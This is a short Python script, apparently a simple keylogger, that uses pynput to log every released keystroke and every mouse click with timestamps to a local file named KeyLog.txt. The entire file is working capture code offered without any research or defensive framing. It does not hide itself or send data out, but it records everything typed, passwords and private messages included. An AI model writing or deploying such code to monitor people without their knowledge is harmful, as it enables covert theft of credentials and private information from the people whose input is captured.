from pynput import keyboard
from pynput import mouse
import logging
import datetime

log_dir = "./"
logging.basicConfig(filename = ("KeyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')



def on_release(key):
    logging.info(str(key))
    
def on_click(x, y, button, pressed):
    if pressed:
        logging.info(str(button))

#allows mouse and keyboard listeners to be used concurrently
with mouse.Listener(on_click=on_click) as listener:
    with keyboard.Listener(on_release=on_release) as listener:
        listener.join()

